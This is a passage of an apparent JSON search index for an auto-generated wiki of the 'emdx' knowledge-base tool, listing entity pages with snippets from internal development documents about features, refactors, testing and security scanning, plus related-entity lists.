\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/id-title/","title":"#id \"title\"","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/id-title/#documents-8","title":"Documents (8)","text":"<ul> <li>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 2: Enhanced Output <p>Changes:</p> </li> <li>Added <code>source_titles: list[tuple[int, str]]</code> to <code>Answer</code> dataclass</li> <li>Populated during retrieval with (doc_id, title) pairs</li> <li> <p>Displayed as <code>#ID \"Title\"</code> instead of bare <code>#ID</code></p> </li> <li> <p>#6523 Gameplan: FEAT-7 Ask-KB Improvements   Section: Phase 2: Enhanced Output (MEDIUM priority)</p> </li> <li>Add <code>source_titles: list[tuple[int, str]]</code> to <code>Answer</code> dataclass in ask_service.py</li> <li>Populate during retrieval (already have doc objects)</li> <li> <p>Display as <code>#ID \"Title\"</code> instead of bare <code>#ID</code></p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Recommended Implementation Order</p> </li> <li>Source Titles in Citations \u2014 Show <code>#ID \"Title\"</code> instead of bare IDs</li> <li>Key Docs in Prime \u2014 Surface most-viewed docs</li> <li> <p>Confidence Indicator \u2014 High/medium/low based on source count</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: 3. <code>--machine</code> Output Mode \u274c MISSING**</p> <p>What it does: Machine-readable output optimized for Claude consumption</p> </li> <li>Answer first, sources after</li> <li>Sources in <code>#ID \"Title\"</code> format</li> <li> <p>Metadata (confidence, method) on stderr</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Gameplan Compliance \u2705</p> <p>...High/medium/low based on source count | Done | | Source citations with titles | \u2705 <code>#ID \"Title\"</code> format | Done | | Token budget (~3000 tokens) | \u2705 12000 char cap (~3000 tokens) | Done | | Machine-readable output | \u2705 <code>--machine</code> flag | Done | | Optimized prompts...</p> </li> <li> <p>#6144 Delegate: Read gameplan by running: emdx view 6103. Implement the Ask  [7/7]   Section: Ask the KB Feature Implementation Complete</p> <p>...ator**: high/medium/low based on source count</p> </li> <li>Source citations with titles: <code>#ID \"Title\"</code> format for easy reference</li> <li>Optimized context budget: ~3000 tokens cap per gameplan specification</li> <li> <p>Concise system prompts: Optimized for machine-readable o...</p> </li> <li> <p>#6103 Gameplan #7: Ask the KB (RAG Q&amp;A)   Section: Implementation Steps</p> <p>...needs structured, token-efficient output</p> </li> <li>Format: answer first, then sources as <code>#ID \"Title\"</code> references</li> <li> <p>No verbose explanations \u2014 Claude can <code>emdx view &lt;id&gt;</code> if it needs more</p> </li> <li> <p>#6099 Gameplan #3: Smart Priming   Section: Implementation Steps</p> </li> <li>No markdown headers or formatting (wastes tokens)</li> <li>Compact key-value style</li> <li>Doc references as <code>#ID \"Title\"</code> (Claude can <code>emdx view ID</code>)</li> <li>Target: &lt;500 tokens for the full prime output</li> </ul>"},{"location":"entities/id-title/#source-titles-in-citations","title":"Source titles in citations","text":""},{"location":"entities/id-title/#sprint-2-output-enhancements-1-2-hours","title":"Sprint 2: Output Enhancements (1-2 hours)","text":""},{"location":"entities/id-title/#step-5-token-efficient-output-format","title":"Step 5: Token-efficient output format","text":""},{"location":"entities/id-title/#related-entities","title":"Related Entities","text":"<ul> <li><code>--recent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>source_titles: list[tuple[int, str]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>recent_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>confidence indicator</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>enhanced output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>emdx ai context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>core filters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>context budget</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>concise system prompts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>ask()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/impact/","title":"impact","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2025-07-07</p>"},{"location":"entities/impact/#documents-14","title":"Documents (14)","text":"<ul> <li>#6518 Any removal Phase 1: Quick wins <p>Added TYPE_CHECKING guards for optional dependencies</p> </li> </ul> <p>emdx/services/file_watcher.py: - Added <code>TYPE_CHECKING</code> import with <code>Observer</code> and <code>FileSystemEvent</code> types from watchdog - Replaced <code>Any</code> type for <code>self.observer</code> with <code>Observer | None</code> - Fixed...</p> <ul> <li> <p>#6357 Delegate: Investigate why the textual upgrade analysis delegate (doc #6353) didn't create a PR</p> <p>The textual agent decided that adding a docs file wasn't a \"code change\" worth PRing. ## Impact</p> </li> <li> <p>Textual upgrade analysis document exists (#6353) \u2713</p> </li> <li>Textual upgrade docs file exists but uncommitted in worktree \u2713</li> <li>No PR was created \u2717</li> <li> <p>Worktree le...</p> </li> <li> <p>#6346 Delegate: PR #565 - Command Helpers Adoption [6/12]   Section: Changes Made</p> </li> <li>Reduces code duplication across command files</li> <li>Establishes a consistent pattern for error handling</li> <li>Makes it easier to add new commands following the pattern</li> <li> <p>All 991 tests pass</p> </li> <li> <p>#6293 Delegate: DEBT-14: Fix ruff violations - 1071 fixes applied   Section: Manually Fixed (38 fixes)</p> </li> <li>Fixed 3 actual bugs (undefined variables, duplicate dict key)</li> <li>Improved exception handling with proper chaining (22 fixes)</li> <li> <p>Cleaner code with unused variable rem...</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag</p> <p>Added <code>_validate_discovery_command()</code> function - Validates the command before execution:</p> </li> <li>Uses <code>shlex.split()</code> to safely parse the command</li> <li>Extracts the base command name (handles full paths like <code>/usr/bin/fd</code>)</li> <li> <p>Rejects commands not i...</p> </li> <li> <p>#42 Fish Sourcing Issue Analysis   Section: Fish Function Sourcing Issue Analysis</p> </li> <li> <p>#8 Claude-Save Command Issues Analysis   Section: Root Cause Analysis</p> </li> <li>Breaks the natural workflow of saving documents</li> <li>Forces use of lower-level tools</li> <li> <p>Reduces confidence in the command-line interface</p> </li> <li> <p>#6765 Wikipedia Stub/Orphan Detection Tooling Research (Complete)   Section: SuggestBot Architecture</p> <p>Impact: SuggestBot increases editing contributions by ~4x compared to random suggestions.</p> </li> <li> <p>#6424 Textual 6.x to 7.x Migration Research   Section: 1. Critical Changes (Require Code Updates)</p> </li> <li>Empty <code>NO_COLOR</code> and <code>FORCE_COLOR</code> env vars now treated as disabled</li> <li>New <code>TTY_COMPATIBLE=1</code> env var for CI/GitHub Actions</li> <li> <p>Impact: May affect CI/testing if using these env vars</p> </li> <li> <p>#6421 Delegate: Research upgrading the anthropic Python SDK from 0.40.0 to 0 [2/5]   Section: Breaking Changes Summary (0.40.0 \u2192 0.79.0)</p> </li> <li> <p>Impact: None for EMDX (requires Python 3.11+)</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 1. GLOBAL STATE: Database Singleton</p> <p>Impact: All database operations share a single connection manager. While the connection itself is context-managed, the path and configuration are global.</p> </li> <li> <p>#6194 Analysis: Delegate + Activity Browser Issues   Section: 6 Issues Found</p> <p>...updates <code>execution.doc_id</code>. The execution record keeps <code>doc_id=NULL</code> forever.</p> </li> <li> <p>Impact: Activity browser can't show output documents, falls back to raw log files.</p> </li> <li> <p>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: 1. SQLiteDatabase Wrapper Architecture Bug (Identified by all 4 tracks)</p> <p>Impact: When tests create a <code>SQLiteDatabase</code> with a custom <code>db_path</code>, the wrapper's connection is ignored, causing test isolation failures.</p> </li> </ul>"},{"location":"entities/impact/#impact_1","title":"Impact","text":""},{"location":"entities/impact/#impact_2","title":"Impact","text":""},{"location":"entities/impact/#impact_3","title":"Impact","text":"<p>Users get cryptic errors when trying to use claude commands without proper setup.</p>"},{"location":"entities/impact/#impact_4","title":"Impact","text":""},{"location":"entities/impact/#rich-1400-environment-variable-behavior","title":"Rich 14.0.0 Environment Variable Behavior","text":""},{"location":"entities/impact/#1-python-38-support-dropped-v0721","title":"1. Python 3.8 Support Dropped (v0.72.1)","text":""},{"location":"entities/impact/#related-entities","title":"Related Entities","text":"<ul> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>logbrowserhost.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>logbrowser.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>exit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>emdx/services/file_watcher.py:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>emdx/services/embedding_service.py:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>cascadeview.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>browsercontainer.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/implementation-details/","title":"implementation details","text":"<p>Type: heading | Mentioned in: 17 documents | First seen: 2025-07-07</p>"},{"location":"entities/implementation-details/#documents-17","title":"Documents (17)","text":"<ul> <li>#6557 Delegate: Document #6544 (Delegate Enhancement Gameplans [4/5]):</li> </ul>"},{"location":"entities/implementation-details/#im","title":"Im","text":"<p>The command generates session summaries by querying recent activity and using AI synthesis. ## Implementation Details</p>"},{"location":"entities/implementation-details/#files-created","title":"Files Created","text":"<ol> <li><code>emdx/commands/wrapup.py</code> - Main command implementation (~225 lines)</li> <li> <p><code>_collect_activity(hours)</code>: Gat...</p> </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]</p> <p>This enables agents to build on prior work without manually searching the knowledge base. ## Design Decisions</p> </li> </ol>"},{"location":"entities/implementation-details/#tag-filtering","title":"Tag Filtering","text":"<ul> <li>Filter to documents tagged <code>needs-review</code> OR <code>delegate-output</code> (as specified)</li> <li> <p>Use <code>search_by_tags()</code> with `mode=\"any\"...</p> </li> <li> <p>#6538 Delegate: Add missing tests for the --task and --done flags in emdx sa [1/3]</p> <p>test_task_not_found_with_done_shows_error - Verifies error when both <code>--task</code> and <code>--done</code> reference non-existent task ID</p> </li> <li> <p>test_task_validation_happens_before_document_creation - Verifies task validation happens upfront (document is not cre...</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation</p> </li> </ul>"},{"location":"entities/implementation-details/#feat-7-ask-kb-improvements-implementation","title":"FEAT-7: Ask-KB Improvements Implementation","text":""},{"location":"entities/implementation-details/#summary","title":"Summary","text":"<p>Successfully implemented all three phases of the FEAT-7 gameplan to enhance the <code>emdx ai ask</code> command with tag/recent filters and enhanced output. ## PR Created</p> <p>PR #648: https://github.co...</p> <ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide <p>emdx delegate --draft Flag</p> </li> </ul>"},{"location":"entities/implementation-details/#purpose","title":"Purpose","text":"<p>Create draft PRs instead of regular PRs for review-first workflows, enabling human review before merge. ### Design Use <code>--draft</code> as a modifier to <code>--pr</code> (not standalone): - Mirrors <code>gh pr create --draft</code> semant...</p> <ul> <li>#6474 EMDX Feature Implementation Synthesis <p>Consider updating instead. ```</p> </li> </ul> <p>Mode B: Baked into Save (<code>emdx save --smart</code>)</p> <pre><code>echo \"content\" | emdx save --title \"Title\" --smart\n# Automatically checks for similar docs\n# Warns if &gt;80% overlap found\n# Suggests tags from nearest neighbors\n...\n\n- **#6467** emdx distill Command Implementation\n  &gt; Distill Command** (`emdx/commands/distill.py`)\n- Typer subcommand for the CLI interface\n- Uses `@app.callback(invoke_without_command=True)` pattern for lazy loading\n- Supports both topic-based search (hybrid search) and tag-based filtering\n- Automati...\n\n- **#6411** Delegate: Implement 'emdx briefing' command. This is a new command tha\n  &gt; **Delegate Executions** - Shows execution stats (success/fail/running counts, cost, tokens)\n5. **Blockers &amp; Issues** - Highlights failed and blocked tasks\n\n## Files Changed\n\n- `emdx/commands/briefing.py` - New command implementation (340 lines)\n- `em...\n\n- **#6296** DEBT-28: O(n\u00b2) Duplicate Detection - Already Fixed\n  &gt; # DEBT-28: Fix O(n\u00b2) duplicate detection algorithm\n\n## Status: ALREADY FIXED \u2705\n\n## Analysis\n\nThe duplicate detection in `emdx/services/duplicate_detector.py` has **already been optimized** from O(n\u00b2) to O(n) using MinHash/LSH. ## Implementation Detai...\n\n- **#6295** Delegate: DEBT-25: Add COLLATE NOCASE index for FTS search\n  *Section: DEBT-25: Add COLLATE NOCASE Indexes for Case-Insensitive Search*\n  &gt; ## Implementation Details\n- Partial indexes exclude deleted/non-deleted documents to keep index size small and queries fast\n- Tags table index added since tag lookups are also case-insensitiv...\n\n- **#6282** DEBT-11: Add security scanning to CI\n  &gt; **Bandit** - Python security linter that scans the `emdx/` directory for common security issues\n2. **pip-audit** - Checks for known dependency vulnerabilities using the exported requirements\n\n### Implementation Details\n\n- Added new `security` job tha...\n\n- **#214** Delete Functionality for CLA Plan\n  &gt; ## Priority: HIGHEST \ud83e\udd47\nWithout delete functionality, the knowledge base will accumulate cruft over time with no way to clean it up. ## Implementation Details\n\n### 1. Add 'd' key binding to cla\n```fish\n--bind='d:execute(fish -c \"source $script_dir/cla...\n\n- **#22** Full-Text Content Search Plan\n  &gt; Need to search content to find specific discussions, code snippets, and solutions. ## Implementation Details\n\n### 1. Enhance claude-find for content search\n```fish\n# Current: searches title only\n# New: search title AND content\nclaude-find \"search ter...\n\n- **#36** Claude Document Template System\n  *Section: Standard Document Format*\n  &gt; ## Implementation Details\n- **Location**: core/filename.fish\n- **Dependencies**: List any requirements\n- **Testing**: How to verify it works\n\n- **#20** Document Linking and References Plan\n  &gt; ## Priority: MEDIUM-HIGH \ud83c\udfc5\nLinks help connect plans to implementations, discussions to outcomes, and build a web of related knowledge. ## Implementation Details\n\n### 1. Link Syntax\nSupport multiple link formats in document content:\n- `[[Document Titl...\n\n- **#21** Version History Implementation Plan\n  *Section: 2. New Commands*\n  &gt; ...Plan\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nv3 \u2502 2025-01-06 15:30 \u2502 Added implementation details\nv2 \u2502 2025-01-06 14:00 \u2502 Updated success criteria  \nv1 \u2502 2025-01-05 23:03 \u2502 Initial plan\n</code></pre>"},{"location":"entities/implementation-details/#related-entities","title":"Related Entities","text":"<ul> <li><code>~1.75 hours</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>wrapup()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>raw json output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>quiet mode (just summary)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>quality assurance</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>preview what would be summarized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>mocked anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>manual test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>linting passes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>implementation:</code>emdx wrapup<code>command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/implementation-plan/","title":"implementation plan","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2025-07-07</p>"},{"location":"entities/implementation-plan/#documents-11","title":"Documents (11)","text":"<ul> <li>#6722 Wiki Generation Architecture Research \u2014 Static Site Options <p>Established ecosystem \u2014 Well-documented, many plugins, large community</p> </li> <li>Low maintenance \u2014 Stable, mature, entering maintenance mode (not dying)</li> </ul>"},{"location":"entities/implementation-plan/#implementation-plan_1","title":"Implementation Plan","text":"<p>Phase 1: Basic wiki generation - emdx wiki build generates markdown fr...</p> <ul> <li>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2] <p>A gradual approach (supporting both) would be MORE complex, adding \"if text mode\" branches everywhere</p> </li> <li>The migration is straightforward \u2014 it's a deterministic mapping with known inputs</li> </ul>"},{"location":"entities/implementation-plan/#implementation-plan_2","title":"Implementation Plan","text":"<p>Phase 1: Database migration (do t...</p> <ul> <li>#6545 Delegate Enhancement Gameplans [1/5] <p>Fallback: Prime/Status</p> </li> <li>If nothing else: Suggest running prime to get context</li> <li>Output: <code>emdx prime</code></li> <li>Reasoning: \"No pending work found. Run prime for context.\"</li> </ul>"},{"location":"entities/implementation-plan/#implementation-plan_3","title":"Implementation Plan","text":""},{"location":"entities/implementation-plan/#files-to-create","title":"Files to Create","text":""},{"location":"entities/implementation-plan/#1-emdxcommandsnextpy-new","title":"1. <code>emdx/commands/next.py</code> (NEW...","text":"<ul> <li>#6409 Delegate: Research and design smarter context injection for emdx deleg [1/2] <p>Including them adds complexity:</p> </li> <li>Would need <code>--context-tasks</code> flag to opt-in</li> <li>Mixing doc context and task context is confusing</li> <li>Tasks already have <code>--epic</code> flag for grouping</li> </ul> <p>If needed later, add <code>--context-tasks 'query'</code> as separate flag. ## Impl...</p> <ul> <li>#276 CLAUDE-KNOWLEDGE-SYSTEM-DESIGN <p>claude-cat      # Raw output for piping <pre><code>\n### 3. Quick Export\n```fish\n# Copy to clipboard\nclaude-copy &lt;id/title&gt;    \n\n# Export to file\nclaude-export &lt;id/title&gt; output.md\n\n# Combine multiple\nclaude-combine --tags \"api\" &gt; api-docs.md\n</code></pre> <p>...</p> <ul> <li>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2] </li> </ul>"},{"location":"entities/implementation-plan/#structured-metadata-design-for-emdx-documents","title":"Structured Metadata Design for EMDX Documents","text":""},{"location":"entities/implementation-plan/#current-state-analysis","title":"Current State Analysis","text":"<p>Existing document fields: - <code>id</code>, <code>title</code>, <code>content</code>, <code>project</code> (core data) - <code>created_at</code>, <code>updated_at</code>, <code>accessed_at</code>, <code>access_count</code> (timestamps/tracking) - `is_delete...</p> <ul> <li>#214 Delete Functionality for CLA Plan </li> </ul>"},{"location":"entities/implementation-plan/#delete-functionality-for-cla-implementation-plan","title":"Delete Functionality for CLA - Implementation Plan","text":""},{"location":"entities/implementation-plan/#overview","title":"Overview","text":"<p>Add delete capability to the <code>cla</code> interactive browser with 'd' key binding and standalone <code>claude-delete</code> command. ## Priority: HIGHEST \ud83e\udd47 Without delete functionality, the knowledge b...</p> <ul> <li>#90 claude-knowledge-implementation </li> </ul>"},{"location":"entities/implementation-plan/#claude-knowledge-system-implementation-plan","title":"Claude Knowledge System - Implementation Plan","text":""},{"location":"entities/implementation-plan/#core-insight-from-db-functions","title":"Core Insight from db-functions","text":"<p>Your db-functions implementation has these key features: 1. Smart completion that queries PostgreSQL in real-time 2.</p> <ul> <li>#22 Full-Text Content Search Plan </li> </ul>"},{"location":"entities/implementation-plan/#full-text-content-search-implementation-plan","title":"Full-Text Content Search - Implementation Plan","text":""},{"location":"entities/implementation-plan/#overview_1","title":"Overview","text":"<p>Enhance search capabilities to search within document content, not just titles and projects. ## Priority: VERY HIGH \ud83e\udd48 Current search only looks at titles/projects.</p> <ul> <li>#20 Document Linking and References Plan </li> </ul>"},{"location":"entities/implementation-plan/#document-linking-and-references-implementation-plan","title":"Document Linking and References - Implementation Plan","text":""},{"location":"entities/implementation-plan/#overview_2","title":"Overview","text":"<p>Enable documents to reference each other, building a connected knowledge graph for better navigation and context. ## Priority: MEDIUM-HIGH \ud83c\udfc5 Links help connect plans to implementati...</p> <ul> <li>#21 Version History Implementation Plan </li> </ul>"},{"location":"entities/implementation-plan/#version-history-for-claude-knowledge-base-implementation-plan","title":"Version History for Claude Knowledge Base - Implementation Plan","text":""},{"location":"entities/implementation-plan/#overview_3","title":"Overview","text":"<p>Add git-style version tracking to documents, allowing us to see how plans and discussions evolved over time. ## Priority: HIGH \ud83e\udd49 As we iterate on designs together, trackin...</p>"},{"location":"entities/implementation-plan/#related-entities","title":"Related Entities","text":"<ul> <li><code>interactive claude list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>smart features</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>overview add</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>extensible</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>new commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>testing plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>implementation details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.2)</li> <li><code>rationale:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> <li><code>document_tags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.8)</li> <li><code>database schema</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.5)</li> </ul>"},{"location":"entities/implementation-steps/","title":"implementation steps","text":"<p>Type: heading | Mentioned in: 22 documents | First seen: 2025-07-07</p>"},{"location":"entities/implementation-steps/#documents-22","title":"Documents (22)","text":"<ul> <li>#6464 Claude Document Templates Comprehensive Guide   Section: Plan Template </li> <li>[Specific, actionable step]</li> <li>[Next step with details]</li> <li> <p>[Continue as needed]</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use</p> </li> <li>Simplify task instructions to just: add, ready, done</li> <li> <p>Remove references to task create, update, depends, run, etc. ## Implementation Steps</p> </li> <li> <p>Rewrite <code>emdx/commands/tasks.py</code> \u2014 replace 12 commands with 4 (add, ready, done, li...</p> </li> <li> <p>#6103 Gameplan #7: Ask the KB (RAG Q&amp;A)</p> <p>Is the output quality good enough for Claude to use? ## Implementation Steps</p> </li> </ul>"},{"location":"entities/implementation-steps/#implementation-steps_1","title":"Implementation Steps","text":""},{"location":"entities/implementation-steps/#update-claudemd","title":"Update CLAUDE.md","text":""},{"location":"entities/implementation-steps/#step-0-audit-existing-emdx-ai-ask","title":"Step 0: Audit existing <code>emdx ai ask</code>","text":"<ul> <li>Test it with several queries</li> <li>Document what works and what doesn't</li> <li>Identify the retrieval strategy and LLM used</li> <li> <p>This might b...</p> </li> <li> <p>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing</p> <p>normal prime output ... #</p> </li> </ul>"},{"location":"entities/implementation-steps/#review-needed","title":"\u23f0 Review needed:","text":""},{"location":"entities/implementation-steps/#6023-api-architecture-47d-stale-high-importance","title":"#6023 \"API Architecture\" \u2014 47d stale, HIGH importance","text":"<pre><code>\n### Mark as reviewed:\n```bash\nemdx touch 6023  # resets staleness timer without incrementing view count\n# Or just: emdx view 6023  # viewing r...\n\n- **#6101** Gameplan #5: Dream Journal (Overnight Consolidation)\n  &gt; #\n# Consolidation:\n#   Merged #6085 + #6091 \u2192 #6100 \"Proze Research &amp; Results\" (85% overlap)\n#   \n# Discovered patterns:\n#   5 docs about \"authentication\" across 3 projects \u2014 consider a cross-project tag\n#   \"gameplan\" tag used on 12 docs but 4 are m...\n\n- **#6100** Gameplan #4: Semantic Find Upgrade\n  &gt; #6045 \u2014 keyword match\n#   3. #6011 \u00a7\"Token Handling\" \u2014 semantic match\n</code></pre>"},{"location":"entities/implementation-steps/#mode-flags","title":"Mode 